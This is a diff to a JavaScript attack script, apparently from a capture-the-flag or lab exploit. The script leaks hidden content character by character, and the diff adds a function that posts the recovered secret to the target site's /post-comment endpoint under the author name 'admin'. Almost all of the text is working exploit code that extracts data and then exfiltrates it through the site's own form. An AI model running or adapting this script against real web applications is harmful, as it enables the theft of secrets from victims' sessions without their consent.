@@ -26,6 +26,29 @@ function checkCharacter(position, character) {
   });
 }
 
+// Function to send the discovered content
+function postDiscoveredContent() {
+  const postData = new URLSearchParams({
+    comment2: discovered_content,
+    "comment-author": "admin"
+  });
+
+  return fetch("/post-comment", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+    },
+    body: postData
+  })
+  .then(response => response.text()) // Assuming response is text
+  .then(text => {
+    console.log('Discovered content was successfully posted.');
+  })
+  .catch(error => {
+    console.error('Failed to post discovered content:', error);
+  });
+}
+
 // Main function to find the content
 async function findContent() {
   let content_length = 20; // Adjust based on expected length
@@ -44,6 +67,7 @@ async function findContent() {
     }
   }
   console.log(`Discovered content: ${discovered_content}`);
+  postDiscoveredContent(); // Post the discovered content once it is fully discovered
 }
 
 // Start the process
